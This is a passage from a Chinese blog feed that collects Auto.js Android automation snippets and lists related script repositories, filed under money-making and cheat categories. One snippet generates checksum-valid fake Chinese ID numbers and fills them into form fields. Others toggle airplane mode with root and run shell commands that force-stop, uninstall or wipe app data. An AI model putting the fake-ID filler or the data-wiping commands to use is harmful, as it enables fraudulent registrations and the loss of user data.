class="string">&quot;8&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;9&quot;</span>, <span class="string">&quot;10&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;2&quot;</span>];<span class="comment">// 加权因子</span></span><br><span class="line">    <span class="keyword">var</span> lastNumberArray = [<span class="string">&quot;1&quot;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;X&quot;</span>, <span class="string">&quot;9&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;2&quot;</span>];<span class="comment">// 校验码</span></span><br><span class="line">    <span class="keyword">var</span> address = <span class="string">&quot;420101&quot;</span>; <span class="comment">// 住址</span></span><br><span class="line">    <span class="keyword">var</span> birthday = <span class="string">&quot;19810101&quot;</span>; <span class="comment">// 生日</span></span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">10</span>).toString() + <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">10</span>).toString() + <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">10</span>).toString();</span><br><span class="line">    <span class="keyword">var</span> array = (address + birthday + s).split(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> total = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i <span class="keyword">in</span> array) &#123;</span><br><span class="line">        total = total + <span class="built_in">parseInt</span>(array[i]) * <span class="built_in">parseInt</span>(coefficientArray[i]);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> lastNumber = lastNumberArray[<span class="built_in">parseInt</span>(total % <span class="number">11</span>)];</span><br><span class="line">    <span class="keyword">var</span> id_no_String = address + birthday + s + lastNumber;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="built_in">document</span>.getElementsByName(<span class="string">&quot;id_no&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; x.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> o = x[i];</span><br><span class="line">        o.value = id_no_String;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//取随机字母数字</span></span><br><span class="line"><span class="comment">//此代码由飞云脚本圈整理（www.feiyunjs.com）</span></span><br><span class="line"><span class="comment">//https://www.cnblogs.com/sunshq/p/4171490.html</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">** randomWord 产生任意长度随机字母数字组合</span></span><br><span class="line"><span class="comment">** randomFlag-是否任意长度 min-任意长度最小位[固定位数] max-任意长度最大位</span></span><br><span class="line"><span class="comment">** xuanfeng 2014-08-28</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRndLetterNumber</span>(<span class="params">randomFlag, min, max</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">&quot;&quot;</span>,</span><br><span class="line">        range = min,</span><br><span class="line">        arr = [<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 随机产生</span></span><br><span class="line">    <span class="keyword">if</span>(randomFlag)&#123;</span><br><span class="line">        range = <span class="built_in">Math</span>.round(<span class="built_in">Math</span>.random() * (max-min)) + min;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;range; i++)&#123;</span><br><span class="line">        pos = <span class="built_in">Math</span>.round(<span class="built_in">Math</span>.random() * (arr.length-<span class="number">1</span>));</span><br><span class="line">        str += arr[pos];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用方法</span></span><br><span class="line"><span class="comment">//生成3-32位随机串：</span></span><br><span class="line">getRndLetterNumber(<span class="literal">true</span>, <span class="number">3</span>, <span class="number">32</span>)</span><br><span class="line"><span class="comment">//生成43位随机串：</span></span><br><span class="line">getRndLetterNumber(<span class="literal">false</span>, <span class="number">43</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//取随机汉字(简体+生僻字)</span></span><br><span class="line"><span class="comment">//此代码由飞云脚本圈整理（www.feiyunjs.com）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRndWord</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&quot;var word=&quot;</span> + <span class="string">&#x27;&quot;\\u&#x27;</span> + (<span class="built_in">Math</span>.round(<span class="built_in">Math</span>.random() * <span class="number">20901</span>) + <span class="number">19968</span>).toString(<span class="number">16</span>) + <span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> word;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="5-时间戳相关"><a href="#5-时间戳相关" class="headerlink" title="5. 时间戳相关"></a>5. 时间戳相关</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取时间戳</span></span><br><span class="line"><span class="keyword">var</span> timestamp = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime()；  <span class="comment">//获取时间戳</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 时间戳转时间</span></span><br><span class="line"><span class="comment">//第一种  2010年12月23日 10:53</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getLocalTime</span>(<span class="params">nS</span>) </span>&#123;     </span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="built_in">parseInt</span>(nS) * <span class="number">1000</span>).toLocaleString().replace(<span class="regexp">/:\d&#123;1,2&#125;$/</span>,<span class="string">&#x27; &#x27;</span>);     </span><br><span class="line">&#125;;    </span><br><span class="line">log(getLocalTime(<span class="number">1293072805</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//第二种    </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getLocalTime</span>(<span class="params">nS</span>) </span>&#123;     </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="built_in">parseInt</span>(nS) * <span class="number">1000</span>).toLocaleString().substr(<span class="number">0</span>,<span class="number">17</span>)</span><br><span class="line">&#125;;    </span><br><span class="line">log(getLocalTime(<span class="number">1293072805</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//第三种  2010-10-20 10:00:00</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getLocalTime</span>(<span class="params">nS</span>) </span>&#123;     </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="built_in">parseInt</span>(nS) * <span class="number">1000</span>).toLocaleString().replace(<span class="regexp">/年|月/g</span>, <span class="string">&quot;-&quot;</span>).replace(<span class="regexp">/日/g</span>, <span class="string">&quot; &quot;</span>);      </span><br><span class="line">&#125;;     </span><br><span class="line">log(getLocalTime(<span class="number">1177824835</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="6-飞行模式切换"><a href="#6-飞行模式切换" class="headerlink" title="6. 飞行模式切换"></a>6. 飞行模式切换</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 打开飞行模式(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 打开飞行模式</span></span><br><span class="line">  <span class="keyword">new</span> Shell().exec(<span class="string">&quot;su -c &#x27;settings put global airplane_mode_on 1; am broadcast -a android.intent.action.AIRPLANE_MODE --ez state true&#x27;&quot;</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> 关闭飞行模式(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//关闭飞行模式</span></span><br><span class="line">  <span class="keyword">new</span> Shell().exec(<span class="string">&quot;su -c &#x27;settings put global airplane_mode_on 0; am broadcast -a android.intent.action.AIRPLANE_MODE --ez state false&#x27;&quot;</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="7-点击指定区域"><a href="#7-点击指定区域" class="headerlink" title="7. 点击指定区域"></a>7. 点击指定区域</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"> click(<span class="number">500</span>, <span class="number">380</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//或者用</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">click(<span class="number">500</span>, <span class="number">380</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="8-自动打开网址"><a href="#8-自动打开网址" class="headerlink" title="8. 自动打开网址"></a>8. 自动打开网址</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;Auto&quot;</span></span><br><span class="line">app.openUrl(<span class="string">&quot;http://chapai.act.qq.com/ph2&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="9-禁止脚本多次运行"><a href="#9-禁止脚本多次运行" class="headerlink" title="9. 禁止脚本多次运行"></a>9. 禁止脚本多次运行</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Author:TimeOut</span></span><br><span class="line"><span class="comment"> * Date: 2018.12.18</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取当前所运行的脚本</span></span><br><span class="line"><span class="keyword">var</span> list = engines.all();</span><br><span class="line"><span class="comment">//双循环比较</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; list.length; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = i + <span class="number">1</span>; j &lt; list.length; j++) &#123;</span><br><span class="line">       <span class="comment">//比较是否只有一个运行</span></span><br><span class="line">        <span class="keyword">if</span> (list[i].getSource().toString() == list[j].getSource().toString()) &#123;</span><br><span class="line">            <span class="comment">//停止二次运行的脚本</span></span><br><span class="line">            list[j].forceStop();</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="10-获取指定应用的版本号"><a href="#10-获取指定应用的版本号" class="headerlink" title="10. 获取指定应用的版本号"></a>10. 获取指定应用的版本号</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 获取指定应用的版本号</span></span><br><span class="line"><span class="comment">* @param &#123;string&#125; packageName 应用包名</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPackageVersion</span>(<span class="params">packageName</span>) </span>&#123;</span><br><span class="line">    importPackage(android.content);</span><br><span class="line">    <span class="keyword">var</span> pckMan = context.getPackageManager();</span><br><span class="line">    <span class="keyword">var</span> packageInfo = pckMan.getPackageInfo(packageName, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> packageInfo.versionName;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="11-停止卸载APP"><a href="#11-停止卸载APP" class="headerlink" title="11. 停止卸载APP"></a>11. 停止卸载APP</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 停止APP</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">killApp</span>(<span class="params">packageName</span>) </span>&#123;</span><br><span class="line">    shell(<span class="string">&#x27;am force-stop &#x27;</span> + packageName, <span class="literal">true</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载APP</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uninstallApp</span>(<span class="params">packageName</span>) </span>&#123;</span><br><span class="line">    shell(<span class="string">&quot;pm uninstall &quot;</span> + packageName, <span class="literal">true</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清除App数据</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clearApp</span>(<span class="params">packageName</span>) </span>&#123;</span><br><span class="line">    shell(<span class="string">&#x27;pm clear &#x27;</span> + packageName, <span class="literal">true</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载最新安装的app</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uninstallAppLast</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pm = context.getPackageManager()</span><br><span class="line">    <span class="keyword">var</span> appList = pm.getInstalledApplications(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">var</span> appInfoList = []</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; appList.size(); i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> app = appList.get(i)</span><br><span class="line">        <span class="keyword">var</span> appInfo = &#123;</span><br><span class="line">            appName: app.loadLabel(pm),</span><br><span class="line">            packageName: app.packageName,</span><br><span class="line">            isSystemApp: app.isSystemApp(),</span><br><span class="line">            firstInstallTime: pm.getPackageInfo(app.packageName, <span class="number">0</span>).firstInstallTime</span><br><span class="line">        &#125;</span><br><span class="line">        appInfoList.push(appInfo)</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    appInfoList.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> b.firstInstallTime - a.firstInstallTime</span><br><span class="line">    &#125;)</span><br><span class="line">    log(<span class="string">&#x27;最新安装的app是=%j&#x27;</span>, appInfoList[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> packageName = appInfoList[<span class="number">0</span>].packageName</span><br><span class="line">    shell(<span class="string">&quot;pm uninstall &quot;</span> + packageName, <span class="literal">true</span>)</span><br><span class="line">    <span class="keyword">return</span> appInfoList[<span class="number">0</span>].appName</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清除最新安装的APP数据</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clearAppLast</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pm = context.getPackageManager()</span><br><span class="line">    <span class="keyword">var</span> appList = pm.getInstalledApplications(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">var</span> appInfoList = []</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; appList.size(); i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> app = appList.get(i)</span><br><span class="line">        <span class="keyword">var</span> appInfo = &#123;</span><br><span class="line">            appName: app.loadLabel(pm),</span><br><span class="line">            packageName: app.packageName,</span><br><span class="line">            isSystemApp: app.isSystemApp(),</span><br><span class="line">            firstInstallTime: pm.getPackageInfo(app.packageName, <span class="number">0</span>).firstInstallTime</span><br><span class="line">        &#125;</span><br><span class="line">        appInfoList.push(appInfo)</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    appInfoList.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> b.firstInstallTime - a.firstInstallTime</span><br><span class="line">    &#125;)</span><br><span class="line">    log(<span class="string">&#x27;最新安装的app是=%j&#x27;</span>, appInfoList[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> packageName = appInfoList[<span class="number">0</span>].packageName</span><br><span class="line">    shell(<span class="string">&#x27;pm clear &#x27;</span> + packageName, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> appInfoList[<span class="number">0</span>].appName</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 停止最新安装的APP</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">killAppLast</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pm = context.getPackageManager()</span><br><span class="line">    <span class="keyword">var</span> appList = pm.getInstalledApplications(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">var</span> appInfoList = []</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; appList.size(); i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> app = appList.get(i)</span><br><span class="line">        <span class="keyword">var</span> appInfo = &#123;</span><br><span class="line">            appName: app.loadLabel(pm),</span><br><span class="line">            packageName: app.packageName,</span><br><span class="line">            isSystemApp: app.isSystemApp(),</span><br><span class="line">            firstInstallTime: pm.getPackageInfo(app.packageName, <span class="number">0</span>).firstInstallTime</span><br><span class="line">        &#125;</span><br><span class="line">        appInfoList.push(appInfo)</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    appInfoList.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> b.firstInstallTime - a.firstInstallTime</span><br><span class="line">    &#125;)</span><br><span class="line">    log(<span class="string">&#x27;最新安装的app是=%j&#x27;</span>, appInfoList[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> packageName = appInfoList[<span class="number">0</span>].packageName</span><br><span class="line">    shell(<span class="string">&#x27;am force-stop &#x27;</span> + packageName, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> appInfoList[<span class="number">0</span>].appName</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;此处整理一些常用的autojs脚本片段,便于查询.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1-如何优雅的开启”无障碍服务”&quot;&gt;&lt;a href=&quot;#1-如何优雅的开启”无障碍服务”&quot; class=&quot;headerlink&quot; title=&quot;</summary>
      
    
    
    
    <category term="网赚" scheme="https://seniortesting.club/categories/%E7%BD%91%E8%B5%9A/"/>
    
    <category term="外挂" scheme="https://seniortesting.club/categories/%E7%BD%91%E8%B5%9A/%E5%A4%96%E6%8C%82/"/>
    
    <category term="autojs" scheme="https://seniortesting.club/categories/%E7%BD%91%E8%B5%9A/%E5%A4%96%E6%8C%82/autojs/"/>
    
    <category term="网赚" scheme="https://seniortesting.club/categories/%E7%BD%91%E8%B5%9A/%E5%A4%96%E6%8C%82/autojs/%E7%BD%91%E8%B5%9A/"/>
    
    <category term="auto.js" scheme="https://seniortesting.club/categories/%E7%BD%91%E8%B5%9A/%E5%A4%96%E6%8C%82/autojs/%E7%BD%91%E8%B5%9A/auto-js/"/>
    
    
    <category term="autojs" scheme="https://seniortesting.club/tags/autojs/"/>
    
    <category term="脚本" scheme="https://seniortesting.club/tags/%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>autojs脚本收集整理</title>
    <link href="https://seniortesting.club/posts/gVbGReuKgb/"/>
    <id>https://seniortesting.club/posts/gVbGReuKgb/</id>
    <published>2021-03-31T14:07:04.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="教程整理"><a href="#教程整理" class="headerlink" title="教程整理"></a>教程整理</h2><p>文档和视频教程: <a href="https://easydoc.xyz/doc/25791054/uw2FUUiw/3bEzXb4y" target="_blank" rel="noopener">https://easydoc.xyz/doc/25791054/uw2FUUiw/3bEzXb4y</a></p><h2 id="相关脚本整理"><a href="#相关脚本整理" class="headerlink" title="相关脚本整理"></a>相关脚本整理</h2><ul><li><del>(部分脚本已不可用)刷短视频类脚本:</del> <a href="https://github.com/c0411034/autoVideo" target="_blank" rel="noopener">https://github.com/c0411034/autoVideo</a></li><li>一些autojs典藏的脚本: <a href="https://github.com/snailuncle/autojsDemo" target="_blank" rel="noopener">https://github.com/snailuncle/autojsDemo</a></li><li>蚂蚁森林收能量脚本: <a href="https://github.com/SuperMonster003/Ant-Forest" target="_blank" rel="noopener">https://github.com/SuperMonster003/Ant-Forest</a></li><li>蚂蚁森林收能量: <a href="https://github.com/TonyJiangWJ/Ant-Forest" target="_blank" rel="noopener">https://github.com/TonyJiangWJ/Ant-Forest</a></li><li>AutoJS项目框架，用于快速构建自动化项目: <a href="https://github.com/TonyJiangWJ/AutoScriptBase" target="_blank" rel="noopener">https://github.com/TonyJiangWJ/AutoScriptBase</a></li><li>蚂蚁庄园自动喂养，定时检测 AutoJS: <a href="https://github.com/TonyJiangWJ/Ant-Manor" target="_blank" rel="noopener">https://github.com/TonyJiangWJ/Ant-Manor</a></li><li>autojs之利用高德地图定位:<a href="https://zhuanlan.zhihu.com/p/360386574" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/360386574</a></li><li>淘宝+京东双十一活动脚本: <a href="https://github.com/hyue418/taobao-11-11" target="_blank" rel="noopener">https://github.com/hyue418/taobao-11-11</a></li><li>朋友圈自动点赞: <a href="https://github.com/xindoo/autojs" target="_blank" rel="noopener">https://github.com/xindoo/autojs</a></li><li>使用Auto.js软件制作的脚本合辑: <a href="https://github.com/Orange-shirt/OrangeJs" target="_blank" rel="noopener">https://github.com/Orange-shirt/OrangeJs</a></li><li>淘宝淘金币自动执行脚本，包含蚂蚁森林收取能量，芭芭农场全任务，解放你的双手:<a href="https://github.com/JavisPeng/taojinbi" target="_blank" rel="noopener">https://github.com/JavisPeng/taojinbi</a></li><li>淘宝支付宝auto.js 脚本合集: <a href="https://github.com/gxcuit/auto_everything" target="_blank" rel="noopener">https://github.com/gxcuit/auto_everything</a></li><li>淘宝相关脚本,对应图片检测方法: <a href="https://github.com/clousky2020/auto.js-" target="_blank" rel="noopener">https://github.com/clousky2020/auto.js-</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;教程整理&quot;&gt;&lt;a href=&quot;#教程整理&quot; class=&quot;headerlink&quot; title=&quot;教程整理&quot;&gt;&lt;/a&gt;教程整理&lt;/h2&gt;&lt;p&gt;文档和视频教程: &lt;a href=&quot;https://easydoc.xyz/doc/25791054/uw2FUUiw/3b</summary>
      
    
    
    
    <category term="脚本" scheme="https://seniortesting.club/categories/%E8%84%9A%E6%9C%AC/"/>
    
    <category term="外挂" scheme="https://seniortesting.club/categories/%E8%84%9A%E6%9C%AC/%E5%A4%96%E6%8C%82/"/>
    
